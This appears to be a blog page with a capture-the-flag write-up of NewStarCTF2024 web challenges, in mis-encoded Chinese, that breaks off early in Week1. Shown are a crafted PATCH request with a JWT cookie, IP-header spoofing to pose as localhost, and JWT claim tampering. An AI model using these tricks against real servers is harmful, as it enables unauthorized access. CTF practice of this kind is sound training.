<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="å‰è¨€ \u200b å¾ˆä¹…ä¹‹å‰çš„æ–°ç”Ÿèµ›æ¯”èµ›ï¼Œç”¨äºå·©å›ºåŸºç¡€ï¼Œå–è¯å’Œæµé‡åˆ†æä¼šå†™ä¸€ä¸‹ï¼Œè¿™é‡Œåªå†™web Week1 PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰ çŸ¥è¯†ç‚¹ï¼šhttpåŸºç¡€ã€PATCHå‘åŒ…ã€JWT">
<title>NewStarCTF2024</title>

<link rel='canonical' href='http://localhost:1313/p/newstarctf2024/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="NewStarCTF2024">
<meta property='og:description' content="å‰è¨€ \u200b å¾ˆä¹…ä¹‹å‰çš„æ–°ç”Ÿèµ›æ¯”èµ›ï¼Œç”¨äºå·©å›ºåŸºç¡€ï¼Œå–è¯å’Œæµé‡åˆ†æä¼šå†™ä¸€ä¸‹ï¼Œè¿™é‡Œåªå†™web Week1 PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰ çŸ¥è¯†ç‚¹ï¼šhttpåŸºç¡€ã€PATCHå‘åŒ…ã€JWT">
<meta property='og:url' content='http://localhost:1313/p/newstarctf2024/'>
<meta property='og:site_name' content='liernian'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-03T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-03T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="NewStarCTF2024">
<meta name="twitter:description" content="å‰è¨€ \u200b å¾ˆä¹…ä¹‹å‰çš„æ–°ç”Ÿèµ›æ¯”èµ›ï¼Œç”¨äºå·©å›ºåŸºç¡€ï¼Œå–è¯å’Œæµé‡åˆ†æä¼šå†™ä¸€ä¸‹ï¼Œè¿™é‡Œåªå†™web Week1 PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰ çŸ¥è¯†ç‚¹ï¼šhttpåŸºç¡€ã€PATCHå‘åŒ…ã€JWT">
    <link rel="shortcut icon" href="/favicon.ico" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’¯</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">liernian</a></h1>
            <h2 class="site-description">ç†æƒ³ä¸»ä¹‰çš„ä¸­äºŒå°‘å¹´</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="http://localhost:1313/en/" >English</option>
                                
                                    <option value="http://localhost:1313/" selected>ç®€ä½“ä¸­æ–‡</option>
                                
                                    <option value="http://localhost:1313/ar/" >Ø¹Ø±Ø¨ÙŠ</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å‰è¨€">å‰è¨€</a></li>
    <li><a href="#week1">Week1</a>
      <ol>
        <li><a href="#pangbai-è¿‡å®¶å®¶1">PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹httpåŸºç¡€patchå‘åŒ…jwt">çŸ¥è¯†ç‚¹ï¼šhttpåŸºç¡€ã€PATCHå‘åŒ…ã€JWT</a></li>
          </ol>
        </li>
        <li><a href="#headach3">headach3</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ— ">çŸ¥è¯†ç‚¹ï¼šæ— </a></li>
          </ol>
        </li>
        <li><a href="#ä¼šèµ¢å—">ä¼šèµ¢å—</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹js">çŸ¥è¯†ç‚¹ï¼šJS</a></li>
          </ol>
        </li>
        <li><a href="#æ™ºæ¢°å±æœº">æ™ºæ¢°å±æœº</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹robotstxtä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šrobots.txtã€ä»£ç å®¡è®¡</a></li>
          </ol>
        </li>
        <li><a href="#è°¢è°¢çš®è›‹">è°¢è°¢çš®è›‹</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹sqlè”åˆæ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šsqlè”åˆæ³¨å…¥</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#week2">Week2</a>
      <ol>
        <li><a href="#pangbai-è¿‡å®¶å®¶2">PangBai è¿‡å®¶å®¶ï¼ˆ2ï¼‰</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹gitæ³„éœ²phpå¼‚å¸¸ä¼ å‚å˜é‡å">çŸ¥è¯†ç‚¹ï¼šgitæ³„éœ²ã€phpå¼‚å¸¸ä¼ å‚å˜é‡åã€</a></li>
          </ol>
        </li>
        <li><a href="#ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—">ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹pythonè„šæœ¬ç¼–å†™">çŸ¥è¯†ç‚¹ï¼špythonè„šæœ¬ç¼–å†™</a></li>
          </ol>
        </li>
        <li><a href="#å¤è¯»æœº">å¤è¯»æœº</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹ssti">çŸ¥è¯†ç‚¹ï¼šssti</a></li>
          </ol>
        </li>
        <li><a href="#è°¢è°¢çš®è›‹-plus">è°¢è°¢çš®è›‹ plus</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹sqlç»•è¿‡ç©ºæ ¼å’Œand">çŸ¥è¯†ç‚¹ï¼šsqlç»•è¿‡ç©ºæ ¼å’Œand</a></li>
          </ol>
        </li>
        <li><a href="#é—å¤±çš„æ‹‰é“¾">é—å¤±çš„æ‹‰é“¾</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹wwwzipæ³„éœ²phpmd5ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šwww.zipæ³„éœ²ã€phpmd5ç»•è¿‡</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#week3">Week3</a>
      <ol>
        <li><a href="#include-me">Include Me</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ–‡ä»¶åŒ…å«dataä¼ªåè®®ä¼ æ–‡ä»¶">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«dataä¼ªåè®®ä¼ æ–‡ä»¶</a></li>
          </ol>
        </li>
        <li><a href="#blindsql1">blindsql1</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹å¸ƒå°”ç›²æ³¨è„šæœ¬">çŸ¥è¯†ç‚¹ï¼šå¸ƒå°”ç›²æ³¨è„šæœ¬</a></li>
          </ol>
        </li>
        <li><a href="#è‡­çš®çš„è®¡ç®—æœº">è‡­çš®çš„è®¡ç®—æœº</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ— å­—æ¯rce">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯rce</a></li>
          </ol>
        </li>
        <li><a href="#è¿™ç…§ç‰‡æ˜¯ä½ å—">è¿™ã€Œç…§ç‰‡ã€æ˜¯ä½ å—</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹pythonä»£ç å®¡è®¡jwtä¼ªé€ ssrf">çŸ¥è¯†ç‚¹ï¼šPythonä»£ç å®¡è®¡ã€JWTä¼ªé€ ã€SSRF</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#week4">Week4</a>
      <ol>
        <li><a href="#pangbai-è¿‡å®¶å®¶4">PangBai è¿‡å®¶å®¶ï¼ˆ4ï¼‰</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹goæ¨¡æ¿æ³¨å…¥goä»£ç å®¡è®¡jwtä¼ªé€ ssrf">çŸ¥è¯†ç‚¹ï¼šgoæ¨¡æ¿æ³¨å…¥ã€goä»£ç å®¡è®¡ã€JWTä¼ªé€ ã€SSRF</a></li>
          </ol>
        </li>
        <li><a href="#blindsql2">blindsql2</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ—¶é—´ç›²æ³¨">çŸ¥è¯†ç‚¹ï¼šæ—¶é—´ç›²æ³¨</a></li>
          </ol>
        </li>
        <li><a href="#chocolate">chocolate</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹intvalmd5ç»•è¿‡ç®€å•ååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šintvalã€MD5ç»•è¿‡ã€ç®€å•ååºåˆ—åŒ–</a></li>
          </ol>
        </li>
        <li><a href="#ezcmsss">ezcmsss</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹cveçš„å¯»æ‰¾">çŸ¥è¯†ç‚¹ï¼šCVEçš„å¯»æ‰¾</a></li>
          </ol>
        </li>
        <li><a href="#ezpollute">ezpollute</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹dockerçš„ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“jsä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šdockerçš„ä½¿ç”¨ï¼ˆï¼‰ã€åŸå‹é“¾æ±¡æŸ“ï¼Œjsä»£ç å®¡è®¡</a></li>
          </ol>
        </li>
        <li><a href="#éšè—çš„å¯†ç ">éšè—çš„å¯†ç </a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹çœ‹ä¸æ‡‚">çŸ¥è¯†ç‚¹ï¼šçœ‹ä¸æ‡‚</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#week5">Week5</a>
      <ol>
        <li><a href="#pangbai-è¿‡å®¶å®¶5">PangBai è¿‡å®¶å®¶ï¼ˆ5ï¼‰</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹ä¸å‡ºç½‘xss">çŸ¥è¯†ç‚¹ï¼šä¸å‡ºç½‘xss</a></li>
          </ol>
        </li>
        <li><a href="#ez_redis">ez_redis</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹redis-luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œcve-2022-0543">çŸ¥è¯†ç‚¹ï¼šRedis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰</a></li>
          </ol>
        </li>
        <li><a href="#è‡­çš®å¹æ³¡æ³¡">è‡­çš®å¹æ³¡æ³¡</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹ååºåˆ—åŒ–æ•°ç»„çš„å·§ç”¨unlinkçš„è¿‡æ»¤">çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–æ•°ç»„çš„å·§ç”¨ã€unlinkçš„è¿‡æ»¤</a></li>
          </ol>
        </li>
        <li><a href="#è‡­çš®çš„ç½‘ç«™">è‡­çš®çš„ç½‘ç«™</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹cve-2024-23334ä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šCVE-2024-23334ã€ä»£ç å®¡è®¡</a></li>
          </ol>
        </li>
        <li><a href="#sqlshell">sqlshell</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹sqlå†™é©¬">çŸ¥è¯†ç‚¹ï¼šsqlå†™é©¬</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#å°ç»“">å°ç»“</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" >
                Wp
            </a>
        
            <a href="/categories/web/" >
                Web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/newstarctf2024/">NewStarCTF2024</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-07-03</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 23 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="å‰è¨€">å‰è¨€
</h2><p>â€‹	å¾ˆä¹…ä¹‹å‰çš„æ–°ç”Ÿèµ›æ¯”èµ›ï¼Œç”¨äºå·©å›ºåŸºç¡€ï¼Œå–è¯å’Œæµé‡åˆ†æä¼šå†™ä¸€ä¸‹ï¼Œè¿™é‡Œåªå†™web</p>
<h2 id="week1">Week1
</h2><h3 id="pangbai-è¿‡å®¶å®¶1">PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰
</h3><h4 id="çŸ¥è¯†ç‚¹httpåŸºç¡€patchå‘åŒ…jwt">çŸ¥è¯†ç‚¹ï¼šhttpåŸºç¡€ã€PATCHå‘åŒ…ã€JWT
</h4><p>Level1ï¼šåœ¨å“åº”å¤´é‡Œçš„Locationå­—æ®µå¯ä»¥æ‰¾åˆ°å»<code>Level2</code>çš„è·¯ç”±</p>
<p>Level2ï¼š<code>Query</code>æ˜¯getçš„å‚æ•°ï¼Œæ‰€ä»¥<code>get</code>ä¼ <code>ask=miao</code></p>
<p>Level3ï¼š<code>post</code>ä¼ <code>say=hello</code></p>
<p>Level4ï¼šåœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ UAå¤´Papa/1.0ï¼Œç„¶åæŠŠsayçš„æ•°æ®æ”¹æˆç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£ï¼Œåœ¨hackbarä¸Šä¼ çš„è¯ï¼Œè‡ªåŠ¨ä¼šurlç¼–ç </p>
<p>Level5ï¼šæç¤ºç”¨PATCHæ–¹æ³•æäº¤ä¸€ä¸ªè¡¥ä¸åŒ…</p>
<p>â€‹	PATCH åŒ…çš„æ ¼å¼ä¸ POST æ— å¼‚ï¼Œä½¿ç”¨ <code>Content-Type: multipart/form-data</code> å‘åŒ…ã€‚ç”¨boundaryå½“ç•Œå®šç¬¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PATCH /?ask=miao HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 8.147.132.32:36002
</span></span><span class="line"><span class="cl">User-Agent: Papa/1.0
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=abc
</span></span><span class="line"><span class="cl">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.xKi0JkzaQ0wwYyC3ebBpjuypRYvrYFICU5LSRLnWq_0
</span></span><span class="line"><span class="cl">Content-Length: 168
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--abc
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.zip&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">--abc
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;say&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£
</span></span><span class="line"><span class="cl">--abc--
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ”¹ä¸€ä¸‹cookieçš„å€¼</p>
<p>â€‹	è¿™é‡Œæˆ‘å¤ç°æ¯æ¬¡å‘åŒ…éƒ½ä¼šé‡æ–°ä»ç¬¬ä¸€å…³å¼€å§‹ï¼Œä¹Ÿä¸åœ¨è¿™é‡Œæµªè´¹å¤ªå¤šæ—¶é—´è¿™é“é¢˜å°±ç›´æ¥æŠŠæ€è·¯è¯´å‡ºæ¥</p>
<p>Level6ï¼šè®¾ç½®æœ¬åœ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">X-Real-IP: 127.0.0.1
</span></span><span class="line"><span class="cl">Referer: http://localhostX-Forwarded-For: 127.0.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level7ï¼šç»™å¯†é’¥çš„JWTï¼ŒæŠŠLevel:6æ”¹ä¸ºLevel:0ã€‚</p>
<h3 id="headach3">headach3
</h3><h4 id="çŸ¥è¯†ç‚¹æ— ">çŸ¥è¯†ç‚¹ï¼šæ— 
</h4><p>å“åº”å¤´</p>
<p><img src="/p/newstarctf2024/image-20250703160721609.png"
	width="1458"
	height="719"
	srcset="/p/newstarctf2024/image-20250703160721609_hu4404065220452293417.png 480w, /p/newstarctf2024/image-20250703160721609_hu9226915178879707396.png 1024w"
	loading="lazy"
	
		alt="image-20250703160721609"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="486px"
	
></p>
<h3 id="ä¼šèµ¢å—">ä¼šèµ¢å—
</h3><h4 id="çŸ¥è¯†ç‚¹js">çŸ¥è¯†ç‚¹ï¼šJS
</h4><p>å½“åˆèŠ±äº†å¥½ä¹…å†™çš„é¢˜ï¼Œé‡æ¸©ä¸€ä¸‹</p>
<p>ç¬¬ä¸€å…³ï¼šæºç </p>
<p><img src="/p/newstarctf2024/image-20250703160858308.png"
	width="780"
	height="155"
	srcset="/p/newstarctf2024/image-20250703160858308_hu3059027064991223487.png 480w, /p/newstarctf2024/image-20250703160858308_hu9170400784217167353.png 1024w"
	loading="lazy"
	
		alt="image-20250703160858308"
	
	
		class="gallery-image" 
		data-flex-grow="503"
		data-flex-basis="1207px"
	
></p>
<p>ç¬¬äºŒå…³ï¼šæ§åˆ¶å°è°ƒç”¨å‡½æ•°</p>
<p>â€‹	è¿™é‡Œè°ƒç”¨è¿™ä¸ªrevealFlag()å‡½æ•°ï¼Œå‚æ•°å°±æ˜¯4cqu1siti0nï¼Œå› ä¸ºä¸‹é¢æœ‰æç¤ºï¼Œè¯¾å°±æ˜¯class</p>
<p><img src="/p/newstarctf2024/image-20250703161138419.png"
	width="1135"
	height="483"
	srcset="/p/newstarctf2024/image-20250703161138419_hu8922544516731038721.png 480w, /p/newstarctf2024/image-20250703161138419_hu14026606730920396425.png 1024w"
	loading="lazy"
	
		alt="image-20250703161138419"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="563px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250703161535912.png"
	width="609"
	height="168"
	srcset="/p/newstarctf2024/image-20250703161535912_hu5298999192452808848.png 480w, /p/newstarctf2024/image-20250703161535912_hu11151461733488836422.png 1024w"
	loading="lazy"
	
		alt="image-20250703161535912"
	
	
		class="gallery-image" 
		data-flex-grow="362"
		data-flex-basis="870px"
	
></p>
<p>ç¬¬ä¸‰å…³ï¼Œæµè§ˆå™¨æ”¹htmlä»£ç ï¼ŒæŠŠå·²å°å°æ”¹æˆè§£å°ï¼Œå› ä¸ºJSä¸­æŒ‰ä¸‹è§£å°æŒ‰é’®åï¼Œä¼šåšä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœé‚£ä¸ªå­—ä¸ç­‰äºè§£å°çš„è¯ï¼Œå°±ä¸èƒ½è·å–flag</p>
<p><img src="/p/newstarctf2024/image-20250703161737351.png"
	width="1798"
	height="944"
	srcset="/p/newstarctf2024/image-20250703161737351_hu11760739495191843936.png 480w, /p/newstarctf2024/image-20250703161737351_hu3989256074593799620.png 1024w"
	loading="lazy"
	
		alt="image-20250703161737351"
	
	
		class="gallery-image" 
		data-flex-grow="190"
